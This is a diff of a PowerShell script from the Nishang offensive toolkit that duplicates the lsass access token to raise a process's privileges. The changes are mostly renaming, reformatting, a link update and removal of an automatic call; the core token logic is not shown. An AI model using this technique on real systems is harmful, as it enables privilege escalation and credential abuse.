@@ -8,12 +8,12 @@ This payload duplicates the Access token of lsass and sets it in the current pro
 The payload must be run with elevated permissions. 
 
 .EXAMPLE 
-PS > .\Enable-DuplicateToken.ps1 
+PS > Enable-DuplicateToken
  
 .LINK 
 http://www.truesec.com 
 http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/05/use-powershell-to-duplicate-process-tokens-via-p-invoke.aspx
-http://code.google.com/p/nishang
+https://github.com/samratashok/nishang
 
 .NOTES 
 Goude 2012, TreuSec 
@@ -23,11 +23,12 @@ Goude 2012, TreuSec
 
 
 
-function Enable-TSDuplicateToken { 
-[CmdletBinding()] 
-param() 
+function Enable-DuplicateToken 
+{ 
+    [CmdletBinding()] 
+    param() 
  
-$signature = @" 
+    $signature = @" 
     [StructLayout(LayoutKind.Sequential, Pack = 1)] 
      public struct TokPriv1Luid 
      { 
@@ -149,7 +150,3 @@ $signature = @"
     [System.Runtime.InteropServices.marshal]::GetLastWin32Error() 
   } 
 }
-
-
-
-Enable-TSDuplicateToken
